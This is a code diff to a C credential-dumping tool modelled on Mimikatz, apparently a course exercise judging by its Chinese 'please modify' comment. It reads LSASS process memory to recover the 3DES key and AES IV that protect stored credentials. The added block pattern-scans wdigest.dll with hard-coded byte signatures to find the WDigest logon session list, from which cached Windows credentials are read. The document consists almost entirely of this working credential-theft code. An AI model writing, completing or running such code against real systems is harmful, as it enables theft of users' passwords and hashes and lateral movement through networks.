@@ -151,8 +151,8 @@ VOID LocateUnprotectLsassMemoryKeys() {
 		HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);// 回显罢了
 	}
 	if (ivSigOffset != 0) {
-		BYTE initializationVector[16] = { 1 };
 		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
+		wprintf(L"ivOffset = 0x%x\n", ivOffset);
 		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset, g_sekurlsa_IV, sizeof g_sekurlsa_IV);
 		//ReadFromLsass(ivPointer, initializationVector, sizeof(initializationVector));
 		wprintf(L"IV Located (len %d): ", AES_128_KEY_LENGTH);
@@ -170,7 +170,22 @@ VOID GetCredentialsFromWdigest() {
 	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");
 
 	/// ... 请修改
-
+	UCHAR pswdSig[] = {
+		//0x48, 0xff ,0x15, 0x4e,0x84, 0x01 ,0x00,
+		0x0f ,0x1f ,0x44 ,0x00 ,0x00,
+		0x48,0x8b,0x35 };
+	logSessListSigOffset = SearchPattern(wdigestBaseAddress, pswdSig, sizeof(pswdSig));
+	if (logSessListSigOffset != 0) {
+		// 从wdigest.dll模块基地址 + 签名偏移 + 签名长度 + 4字节偏移中读取出链表头部地址
+		ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof(pswdSig), &logSessListOffset, sizeof(logSessListOffset));
+		wprintf(L"logSessListOffset = 0x%x\n", logSessListOffset);
+		ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof(pswdSig) + 4 + logSessListOffset, &logSessListAddr, sizeof(logSessListAddr));
+		wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);
+	}
+	else {
+		wprintf(L"Failed to locate Wdigest session list.\n");
+		return;
+	}
 	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
 	pList = entry.This;
 
